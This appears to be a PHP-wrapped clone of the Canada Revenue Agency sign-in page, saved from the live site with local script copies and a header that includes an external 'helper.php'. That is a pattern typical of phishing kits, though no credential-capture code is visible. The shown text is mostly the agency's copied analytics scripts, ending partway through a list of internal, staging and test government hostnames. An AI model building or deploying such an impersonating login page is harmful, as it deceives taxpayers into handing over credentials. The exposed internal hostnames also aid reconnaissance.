<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<!-- saved from url=(2058)https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/login?TYPE=33554432&REALMOID=06-26a97681-2e5a-105d-9505-84cb2b4afb5e&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=-SM-u%2bl%2fc0bDuFqdbz6ofgybxcQlkO%2by5jWhT9%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo&TARGET=-SM-HTTP%3a%2f%2fcms-%2Dsgj%2ecra-%2Darc%2egc%2eca%2fgol-%2Dged%2fawsc%2fcms%2fmacauth%3fTYPE%3d33554432%26REALMOID%3d06-%2D00ba5d0a-%2D2e5a-%2D105d-%2D9505-%2D84cb2b4afb5e%26GUID%3d%26SMAUTHREASON%3d0%26METHOD%3dGET%26SMAGENTNAME%3d-%2DSM-%2Du-%2bl-%2fc0bDuFqdbz6ofgybxcQlkO-%2by5jWhT9-%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo%26TARGET%3d-%2DSM-%2DHTTP-%3a-%2f-%2fcms-%2D-%2Dsgj-%2ecra-%2D-%2Darc-%2egc-%2eca-%2fgol-%2D-%2Dged-%2fawsc-%2fcms-%2fpostlogin-%3fSAMLRequest-%3dfZBPS8QwEMXv-%2D-%2BylC7m3TbPdPQ1tYWIQFBVHx4EWmadqNpEnNpOrHN1sPqxfn-%2D-%2BJg3836vOszhbB-%2D-%2FU-%2D-%2B6wwkK-%2D-%2FRWKzp7K1wgBqFhVGhCFI8Hu5uBU-%2D-%2BZmLwLTjpDyTE6tIWgna3pOYQJRZbJERMc3lLpIQEv00GmEi7qJ2bT3BotM4TRcERHyY3zUi0BatqDQUXJ6VjT177tFOvkZg1lsW93m37brtk-%2D-%2Blwq2fdvnO1aWXVzFe0DUH-%2D-%2BpqRpzVyWIAG2rKGS-%2D-%2BSnCeseGJc8FwUmxdKnpXHJXGEoc2KxKks5mLx-%2D-%2Bp8GRBT-%2D-%2BbyE-%2D-%2BVv5CThvjBm1TWLjhL3eVXS83qyr73XXzDQ-%2D-%3D-%2D-%3D-%26RelayState-%3d3542d42435a8a4c21cf64d7e90d94a54fb511eff-%26SigAlg-%3dhttp-%2D-%3A-%2D-%2F-%2D-%2Fwww-%2ew3-%2eorg-%2D-%2F2001-%2D-%2F04-%2D-%2Fxmldsig-%2D-%2Dmore-%2D-%23rsa-%2D-%2Dsha256-%26Signature-%3dwdb8kpznrwrYyJQknVWX3f7bkgh07PoT-%2D-%2FwvhT4C68n6Ojbc6Gh259pmpw3yKLhPnNLm1I7GbCsNotHy9ajwIRToRHUjkSH7Ib0vpzfi5Bh0VGafkG2E91OGUqhn2j-%2D-%2FNW-%2D-%2BPXQBkiVubMW1UNeMHSfV3ty1HTBM93XNYwdnJByCp-%2D-%2BQS6pmMiFftNA-%2D-%2B02UwxWYy6rKizMtP-%2D-%2B2h0i4fbqAcdNAB6fZpH8JOZTXEpryPqGtD-%2D-%2FVvuA6KLY-%2D-%2BByoLaBQGiZpa04jVbj2Au4wxBX-%2D-%2BHi-%2D-%2BTXB4DIZFQ0JCzPt0wKwdX1mnUEW6scH9AyFV-%2D-%2FjZ17-%2D-%2Bfczr7Lay3KHWZoiVKVUhZdvxA-%2D-%3D-%2D-%3D-%26SMPORTALURL-%3d3s3oC2jIJ0qEQ12Yiq9kAEjDKEUuKufwTJYavzvDtmH65tOSqAjOcKBbNnWrHFISoEmNt55oyAIlNgDZ-%2D-%2FeXB9Z-%2D-%2Fegu2zyozy -->
<html class="js backgroundsize borderimage csstransitions fontface svg details progressbar meter mathml cors xlargeview wb-enable" lang="en" dir="ltr" style="background-color:#f9f9f9"><!--<![endif]--><head class="at-element-marker"><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script type="text/javascript" async="" src="./CRA_files/timeout.js.download"></script><script src="./CRA_files/en.min.js.download"></script><script src="./CRA_files/jquery.magnific-popup.min.js.download"></script><script type="text/javascript" src="./CRA_files/cra-common-var.js.download"></script>
<script async="" defer="" type="text/javascript" src="./CRA_files/cra-common-util-qa.js.download" id="_imp_apg_dip_" _imp_apg_cid_="sed-cra_arc-0b00c0b0"></script>

<title>Canada Revenue Agency -  CRA Sign in</title>



<meta content="width=device-width, initial-scale=1" name="viewport">
<meta name="robots" content="noindex, nofollow, noarchive">
<meta name="format-detection" content="telephone=no">


	<meta name="dcterms.language" content="eng">
	<meta name="dcterms.title" content="Canada Revenue Agency - CRA Sign in"> 
	<meta name="dcterms.service" content="CRA-ARC_AMS-CMS_SGA-SGJ">
	<meta name="dcterms.creator" content="Canada Revenue Agency">
	
	
	
		
	    	<meta name="dcterms.accessRights" content="2">	  
	  

    <script src="./CRA_files/launch-59d77766b86a.min.js.download"></script><script src="./CRA_files/AppMeasurement.min.js.download" async=""></script><script>
/*
* Find most common Personal Identifiable Information (PII) in a string and return either the cleaned string either true/false
* @param {string} str
* @param {boolean} toClean
* @return {string | true | false}
* @example
* findPotentialPII( "email:test@test.com, phone:123 123 1234", true, true )
* returns "email:[REDACTED/CAVIARD�], phone:[REDACTED/CAVIARD�]",
* findPotentialPII( "email:test@test.com, phone:123 123 1234", false, false )
* returns true
* findPotentialPII( "email:test@test.com, phone:123 123 1234", true, false )
* returns 'email:, phone:'
*/
findPotentialPII = function( str, toClean, bMarker ) {

	if ( typeof str  !== "string" ) {
		return false;
	}
	var regEx = [
			[ /\d(?:[\s\-\\.\\/]?\d){8,}(?!\d)/ig, "[REDACTED/CAVIARD�]" ], //9digits or more pattern
			[ /\b[A-Za-z]{2}[\s\\.-]*?\d{6}\b/ig, "[REDACTED/CAVIARD�]" ], //canadian nr passport pattern
			[ /\b(?:[a-zA-Z0-9_\-\\.]+)(?:@|%40|%2540)(?:[a-zA-Z0-9_\-\\.]+)\.(?:[a-zA-Z]{2,5})\b/ig, "[REDACTED/CAVIARD�]" ], // updated email pattern
			[ /\b[A-Za-z]\d[A-Za-z][ -]?\d[A-Za-z]\d\b/ig, "[REDACTED/CAVIARD�]" ], //postal code pattern
			[ /(?:(username|user)[%20]?([:=]|(%EF%BC%9A))[^\s&]*)/ig, "[REDACTED/CAVIARD�]" ], // username patterns
			[ /(?:(password|pass)[%20]?([:=]|(%EF%BC%9A))[^\s&]*)/ig, "[REDACTED/CAVIARD�]" ], // password patterns
            [ /(?:(pw|login|id|name)[%20]?([:=]|(%EF%BC%9A))[^\s&]*)/ig, "[REDACTED/CAVIARD�]" ] // other username /password variations
		],
		isFound = false;

	for ( var arr in regEx ) {
		if ( str.match( regEx[ arr ][ 0 ] ) ) {
			isFound = true;
			if ( toClean ) {
				str = str.replaceAll( regEx[ arr ] [ 0 ], ( bMarker === true ? regEx[ arr ][ 1 ] : "" ) );
			}
		}
	}

	return toClean && isFound ? str : isFound;
};

// scrub only email/user/pass 
// slash repaced with hyphen due to folder count in url
urlPotentialPII = function( str, toClean, bMarker ) {

	if ( typeof str  !== "string" ) {
		return false;
	}
	var regEx = [
			[ /\b(?:[a-zA-Z0-9_\-\\.]+)(?:@|%40|%2540)(?:[a-zA-Z0-9_\-\\.]+)\.(?:[a-zA-Z]{2,5})\b/ig, "[REDACTED-CAVIARD�]" ], // updated email patterns
           	[ /(?:(username|user)[%20]?([:=]|(%EF%BC%9A))[^\s&]*)/ig, "[REDACTED/CAVIARD�]" ], // username patterns
			[ /(?:(password|pass)[%20]?([:=]|(%EF%BC%9A))[^\s&]*)/ig, "[REDACTED/CAVIARD�]" ], // password patterns
            [ /(?:(pw|login|id|name)[%20]?([:=]|(%EF%BC%9A))[^\s&]*)/ig, "[REDACTED/CAVIARD�]" ], // other username /password variations
            [ /\b(?:[A-Za-z0-9%._+-]+(@|%40|%2540)|\w*gmail\W*com)\b/ig, "[REDACTED/CAVIARD�]" ] // gmailcom or gmail.com instances
		],
		isFound = false;

	for ( var arr in regEx ) {
		if ( str.match( regEx[ arr ][ 0 ] ) ) {
			isFound = true;
			if ( toClean ) {
				str = str.replaceAll( regEx[ arr ] [ 0 ], ( bMarker === true ? regEx[ arr ][ 1 ] : "" ) );
			}
		}
	}

	return toClean && isFound ? str : isFound;
};
</script><script>
var targetDomain = location.host
window.targetGlobalSettings = {  
   cookieDomain: targetDomain // set cookies on the subdomain
};
</script><script>
document.addEventListener(adobe.target.event.REQUEST_SUCCEEDED, function (e) {
    window.ttMETA= typeof(window.ttMETA)!="undefined" ? window.ttMETA : [];

    var tokens=e.detail.responseTokens;

    if (isEmpty(tokens)) {
      return;
    }

    var uniqueTokens = distinct(tokens);

    uniqueTokens.forEach(function(token) {
      window.ttMETA.push({
        'ActivityName': token["activity.name"],
        'ActivityId' : token["activity.id"],
        'ExperienceName': token["experience.name"],
        'ExperienceId': token["experience.id"],
        'OfferId': token["offer.id"],
        'OfferName': token["offer.name"],
        'GeoCity': token["geo.city"],
        'GeoState': token["geo.state"],
        'MboxName': e.detail.mbox});
    });
  });

  function isEmpty(val){
    return (val === undefined || val == null || val.length <= 0) ? true : false;
  }

  function key(obj) {
     return Object.keys(obj)
    .map(function(k) { return k + "" + obj[k]; })
    .join("");
  }

  function distinct(arr) {
    var result = arr.reduce(function(acc, e) {
      acc[key(e)] = e;
      return acc;
    }, {});

    return Object.keys(result)
    .map(function(k) { return result[k]; });
  }
</script><script>
/*jshint maxerr: 100000, laxcomma: true */
// allowlist/blocklist 

/*
 * Domain Allowlist and domain specific settings
*/

//make sure to update thisDomain with nulls!!!
_satellite.gcCustom = {
    domain_blocklist: ['/analytique-analytics/',
            'checkingvisa.com',
            '/naics/2017/v3/',
  			'/gol-ged/awsc/amss/browser/check',
  			'/gol-ged/awsc/amss/enrol/logincheck',
  			'beta.buyandsell.gc.ca/standing-offers-and-supply-arrangements-application/my-workspace/user-management/',
  			'beta.achatsetventes.gc.ca/application-d-offres-a-commandes-et-d-arrangements-en-matiere-d-approvisionnement/mon-espace-travail/gestion-des-utilisateurs/',
  			'gol-ecas-dev.ca.gc.ca/ecas/viewcasehistory.do',
  			'services3.cic.gc.ca/ecas/viewcasehistory.do',
            'ifolio.justice.gc.ca/',
            'jobsearch/jobalert/register/dkw=',
            'jobsearch/alertemplois/enregistrer/dkw=',
            'jobsearch/jobalert/register/flg=',
            'jobsearch/alertemplois/enregistrer/flg=',
            'tfwp-jb.lmia.esdc.gc.ca/employer/',
            'ptet-ge.eimt.edsc.gc.ca/employer/',
            //'/child/children/',
            //'/enfant/enfants/',
            //'mapayegc-mygcpay.tpsgc-pwgsc.gc.ca/en/mygcpay/chequepaiedetaille-detailedpaycheque/'
            '/reg/inscriptionind1:',
            '/reg/indregister1:',
                       
    ],
    protocol_blocklist: ['javascript:', 'mailto:', 'tel:', 'blob:', 'data:'],

    /*Follow this syntax for adding items to the allowlist
    Double check and confirm you are adding to the STAGE or LIVE allowlist
    Double check spelling and syntax for errors
    */
    thisDomain: { AppName: null, LoginStatus: null },
    domain_allowlist: {
        stage: {
          //'...' : {AppName : null, LoginStatus : null}
          //--- all items MUST inlcude a comma in order to append the next line item, except the last item does not require a comma
          //TEsting
          'www.canada.ca': { AppName: null, LoginStatus: null },
          'canada-aem-s3-stage.adobecqms.net': { AppName: null, LoginStatus: null },
          'emploisfp-psjobs.cfp-psc.gc.ca': { AppName: null, LoginStatus: null },
          'psjobs-emploisfp.psc-cfp.gc.ca': { AppName: null, LoginStatus: null },
          'www.youth-jeunesse.service.canada.ca': { AppName: null, LoginStatus: null },
          'www.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'canadabuys.canada.ca': { AppName: null, LoginStatus: null },
          'etatpasseport-passportstatus.service.canada.ca': { AppName: null, LoginStatus: null },
          //Canada Revenue Agency
          'performance.alpha.canada.ca': { AppName: null, LoginStatus: null },
          'www.staging.omega.dce-eir.net': { AppName: null, LoginStatus: null },
          'staging.omega.dce-eir.net': { AppName: null, LoginStatus: null },
          //CRA Secure Portal UT
          'cp-ut.isvcs.net': { AppName: null, LoginStatus: null },
          'rp-ut.isvcs.net': { AppName: null, LoginStatus: null },
          'cp-ut2.isvcs.net': { AppName: null, LoginStatus: null },// troubleshooting
          'rp-ut2.isvcs.net': { AppName: null, LoginStatus: null },
          'rp-ut4.isvcs.net': { AppName: null, LoginStatus: null },
          //CRA Secure Portal EF
          'rp-ef.isvcs.net': { AppName: null, LoginStatus: null },
          'cp-ef.isvcs.net': { AppName: null, LoginStatus: null },
          //CRA Secure Portal EA
          'rp-ea.isvcs.net': { AppName: null, LoginStatus: null },
          'cp-ea.isvcs.net': { AppName: null, LoginStatus: null },
          //CRA Secure Portal SI
          'ams-sga-si.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'cms-sgj-si.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'ams-sga-si2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'cms-sgj-si2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          //CRA Secure Portal UA
          'ams-sga-ua.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'cms-sgj-ua.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'ams-sga-ua2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'cms-sgj-ua2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          //CRA Secure Portal OT
          'apps1.ams-sga-ot.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps2.ams-sga-ot.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps3.ams-sga-ot.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps4.ams-sga-ot.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps5.ams-sga-ot.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps6.ams-sga-ot.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps7.ams-sga-ot.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps8.ams-sga-ot.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'cms-sgj-ot.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps1.ams-sga-ot2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps2.ams-sga-ot2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps3.ams-sga-ot2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps4.ams-sga-ot2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps5.ams-sga-ot2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps6.ams-sga-ot2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps7.ams-sga-ot2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps8.ams-sga-ot2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'cms-sgj-ot2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          //CRA Non Secure Portal UT
          'apps-ut.isvcs.net': { AppName: null, LoginStatus: null }, //testing
          'apps-ut2.isvcs.net': { AppName: null, LoginStatus: null }, //testing
          'apps-ut.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps-ut2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'rp-ut.isvcs.net/gol-ged/mima/ngbeta/#/bus/': { AppName: null, LoginStatus: null },
          //CRA Non Secure Portal SI
          'apps-si.isvcs.net': { AppName: null, LoginStatus: null },
          'apps-si2.isvcs.net': { AppName: null, LoginStatus: null },
          //CRA Non Secure Portal UA
          'apps-ua.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps-ua2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps-ua.isvcs.net': { AppName: null, LoginStatus: null },
          'apps-ua2.isvcs.net': { AppName: null, LoginStatus: null },
          //CRA Non Secure Portal OT
          'apps-ot.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps-ot2.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps-ot.isvcs.net': { AppName: null, LoginStatus: null },
          //CRA Non Secure Portal EF
          'apps-ef.isvcs.net': { AppName: null, LoginStatus: null },
          //CRA Non Scure Portal EA
          'apps-ea.isvcs.net': { AppName: null, LoginStatus: null },
         //Communications Security Establishment
          'dev-cse-cst.hiringplatform.ca': { AppName: null, LoginStatus: null },
          //Public Service Commission
          'test-psjobs-emploisfp.psc-cfp.gc.ca': { AppName: null, LoginStatus: null },
          'test-emploisfp-psjobs.cfp-psc.gc.ca': { AppName: null, LoginStatus: null },
          //Health Canada
          'dev.healthycanadians.gc.ca': { AppName: null, LoginStatus: null },
          'dev.canadiensensante.gc.ca': { AppName: null, LoginStatus: null },
          'sad-drlsrv-dev.hc-sc.gc.ca': { AppName: null, LoginStatus: null },
          //IRCC ePassport App
          'web.passport-online-staging.apps.cic.gc.ca': { AppName: null, LoginStatus: null },
          'web.passport-online-development.apps.cic.gc.ca': { AppName: null, LoginStatus: null },
          'eservices1.ci.gc.ca': { AppName: null, LoginStatus: null },
          'services3.ci.gc.ca': { AppName: null, LoginStatus: null },
          'www.services3.ci.gc.ca': { AppName: null, LoginStatus: null },
          // Employment and Social Development Canada 
          'int16-ssl.services.gc.qat': { AppName: null, LoginStatus: null },
          'www.int16-ssl.services.gc.qat': { AppName: null, LoginStatus: null },
          'srv241-s2.lab.hrdc-drhc.gc.ca': { AppName: null, LoginStatus: null },
          'www.srv241-s2.lab.hrdc-drhc.gc.ca': { AppName: null, LoginStatus: null },
          'intradev16-i.intra.dev': { AppName: null, LoginStatus: null },
          'test.cva.service.canada.ca': { AppName: null, LoginStatus: null },
          'test.pbc.service.canada.ca': { AppName: null, LoginStatus: null },
          'secure-client-hub-dev.bdm-dev-rhp.dts-stn.com': { AppName: null, LoginStatus: null },
          'sys1.jobbank.gc.qat': { AppName: null, LoginStatus: null },
          'sys1.guichetemplois.gc.qat': { AppName: null, LoginStatus: null },
          'passport-status-staging.dev-dp.dts-stn.com': { AppName: null, LoginStatus: null },
          'int-srv265.services.gc.qat': { AppName: null, LoginStatus: null },
          'seniors-journey-staging.dev-dp.dts-stn.com': { AppName: null, LoginStatus: null },
          'dev2.jobbank.gc.qat': { AppName: null, LoginStatus: null },
          'dev2.guichetemplois.gc.qat': { AppName: null, LoginStatus: null },
          'passport-status-test.dev-dp.dts-stn.com': { AppName: null, LoginStatus: null },
          'srv241-s2.sade.hrdc-drhc.gc.ca': { AppName: null, LoginStatus: null },
          'uat.cva.service.cloud-nuage.canada.ca': { AppName: null, LoginStatus: null },
          'sys16-ssl.services.gc.qat': { AppName: null, LoginStatus: null },
          'secure-client-hub-staging.bdm.dshp-phdn.net': { AppName: null, LoginStatus: null },
          'test-org-platform.nonprod.youth-jeunesse.service.canada.ca': { AppName: null, LoginStatus: null },
          'test-org-platform-intake.nonprod.youth-jeunesse.service.canada.ca': { AppName: null, LoginStatus: null },
          'secure-client-hub-dev.bdm.dshp-phdn.net': { AppName: null, LoginStatus: null },
          'cdcp-dev.dev-dp.dts-stn.com': { AppName: null, LoginStatus: null },
          'cdcp-int.dev-dp.dts-stn.com': { AppName: null, LoginStatus: null },
          'cdcp-staging.dev-dp.dts-stn.com': { AppName: null, LoginStatus: null },
          'cdcp-staging.dev-dp-internal.dts-stn.com': { AppName: null, LoginStatus: null },
          'srv024.service.canada.ca': { AppName: null, LoginStatus: null },
          'esdc-bdm-ei-dev-benefitestimator-fe-cc-staging.azurewebsites.net': { AppName: null, LoginStatus: null },
          'esdc-bdm-ei-dev-benefitestimator-fe-cc.azurewebsites.net': { AppName: null, LoginStatus: null },
          'test-org-platform.dev-dp.dts-stn.com': { AppName: null, LoginStatus: null },
          'srv113-s.sade.hrdc-drhc.gc.ca': { AppName: null, LoginStatus: null },
          'srv136.services.gc.ca': { AppName: null, LoginStatus: null },
          'mscad-sys2-s2.bdm.dshp-phdn.net': { AppName: null, LoginStatus: null },
          'N35010293.hrdc-drhc.net': { AppName: null, LoginStatus: null },
          // Public Services and Procurement Canada
          'www.mapayegc-mygcpay-preprod.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'mapayegc-mygcpay.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'mapayegc-mygcpay-preprod.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'rate01.gcsurplus.ca': { AppName: null, LoginStatus: null },
          'ont-intradev.pwgsc-tpsgc.gc.ca': { AppName: null, LoginStatus: null },
          'www.ont-intradev.pwgsc-tpsgc.gc.ca': { AppName: null, LoginStatus: null },
          'ont-extradev.pwgsc-tpsgc.gc.ca': { AppName: null, LoginStatus: null },
          'www.ont-extradev.pwgsc-tpsgc.gc.ca': { AppName: null, LoginStatus: null },
          'ont-internetdev.pwgsc-tpsgc.gc.ca': { AppName: null, LoginStatus: null },
          'www.ont-internetdev.pwgsc-tpsgc.gc.ca': { AppName: null, LoginStatus: null },
          'ont-internetdev.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'www.ont-internetdev.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'staging.achatscanadabuys.ca': { AppName: null, LoginStatus: null },
          'm8-test.achatscanadabuys.ca': { AppName: null, LoginStatus: null },
          'm8-uat.achatscanadabuys.ca': { AppName: null, LoginStatus: null },
          'm8-dev-collab.achatscanadabuys.ca': { AppName: null, LoginStatus: null },
          'www.preprod.mapayegc-mygcpay.gc.ca': { AppName: null, LoginStatus: null },
          'preprod.mapayegc-mygcpay.gc.ca': { AppName: null, LoginStatus: null },
          'viclaplinux12.jea.lan': { AppName: null, LoginStatus: null },
          'aatesting-penweb.work.int.jea-engr.ca': { AppName: null, LoginStatus: null },
          'bravopenweb07.dev.jea.lan': { AppName: null, LoginStatus: null },
          'estimateurae-eiestimator.service.canada.ca': { AppName: null, LoginStatus: null },
          'beta.sosa.canadabuys.canada.ca': { AppName: null, LoginStatus: null },
          'beta.ocama.achatscanada.canada.ca': { AppName: null, LoginStatus: null },
          //Library and Archive Canada
          'www.dev2-www.bac-lac.gc.ca': { AppName: null, LoginStatus: null },
          'dev2-www.bac-lac.gc.ca': { AppName: null, LoginStatus: null },
          //StatCan
          'www.daaas-portal.dev.cloud.statcan.ca': { AppName: null, LoginStatus: null },
          'daaas-portal.dev.cloud.statcan.ca': { AppName: null, LoginStatus: null },
          //Justice Canada
          'ifolio.justice.gc.ca': { AppName: null, LoginStatus: null },
          //Shared Service Canada
          'plus-test.ssc-spc.gc.ca': { AppName: null, LoginStatus: null },
         //Elections Canada
          'ec9wbisprev01.elections.ca': { AppName: null, LoginStatus: null },
          'ec9wbdterevt1.elections.ca': { AppName: null, LoginStatus: null },
          'ec9wbsterevv1.elections.ca': { AppName: null, LoginStatus: null },
          'ec9sttswbrev01.elections.ca': { AppName: null, LoginStatus: null },
          'ecdev_maint-pesc.ecade.elections.ca': { AppName: null, LoginStatus: null },
          'secure.test.elections.ca': { AppName: null, LoginStatus: null },
          'ec9stvwbpfpi01.elections.ca': { AppName: null, LoginStatus: null },
          'test.elections.ca': { AppName: null, LoginStatus: null },
          'ec9stvwbpfpi01': { AppName: null, LoginStatus: null },
          
          
        },
        live: {
        //'...' : {AppName : null, LoginStatus : null}
          //'...' : {AppName : null, LoginStatus : null}
          //--- all items MUST inlcude a comma in order to append the next line item, except the last item does not require a comma
          //Canada Revenue Agency
          'ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'cms-sgj.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps1.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps2.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps3.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps4.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps5.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps6.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps7.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps8.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'arc-cra.gc.ca': { AppName: null, LoginStatus: null },
          'arc.gc.ca': { AppName: null, LoginStatus: null },
          'apps.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.apps.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'cra.gc.ca': { AppName: null, LoginStatus: null },
          'www.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.cms-sgj.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.apps1.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.apps2.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.apps3.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.apps4.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.apps5.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.apps6.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.apps7.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.apps8.ams-sga.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.arc-cra.gc.ca': { AppName: null, LoginStatus: null },
          'www.arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.apps.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.cra-arc.gc.ca': { AppName: null, LoginStatus: null },
          'www.cra.gc.ca': { AppName: null, LoginStatus: null },
          //ESDC IRS
          'srv265.hrdc-drhc.gc.ca': { AppName: null, LoginStatus: null },
          //Employment and Social development Canada
          'srv136.services.gc.ca': { AppName: null, LoginStatus: null },
          'www.srv136.services.gc.ca': { AppName: null, LoginStatus: null },
          'psjobs-emploisfp.psc-cfp.gc.ca': { AppName: null, LoginStatus: null },
          'emploisfp-psjobs.cfp-psc.gc.ca': { AppName: null, LoginStatus: null },
          'www.cva.service.canada.ca': { AppName: null, LoginStatus: null },
          'cva.service.canada.ca': { AppName: null, LoginStatus: null },
          'www.pbc.service.canada.ca': { AppName: null, LoginStatus: null },
          'pbc.service.canada.ca': { AppName: null, LoginStatus: null },
          'www.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'estimateursv-oasestimator.service.canada.ca': { AppName: null, LoginStatus: null },
          'www.estimateursv-oasestimator.service.canada.ca': { AppName: null, LoginStatus: null },
          'retraite-retirement.service.canada.ca': { AppName: null, LoginStatus: null },
          'www.retraite-retirement.service.canada.ca': { AppName: null, LoginStatus: null },
          'service.canada.ca': { AppName: null, LoginStatus: null },
          'www.service.canada.ca': { AppName: null, LoginStatus: null },
          'equivision.services.gc.ca': { AppName: null, LoginStatus: null },
          'www.equivision.services.gc.ca': { AppName: null, LoginStatus: null },
          'srv024.service.canada.ca': { AppName: null, LoginStatus: null },
          'on.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.on.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'sk.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.sk.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'ab.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.ab.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'bc.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.bc.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'mb.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.mb.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'nb.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.nb.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'nl.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.nl.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'ns.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.ns.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'nt.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.nt.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'nu.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.nu.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'qc.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.qc.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'pe.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.pe.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'yt.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'www.yt.jobbank.gc.ca': { AppName: null, LoginStatus: null },
          'on.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'www.on.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'sk.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'www.sk.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'ab.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'www.ab.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'bc.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
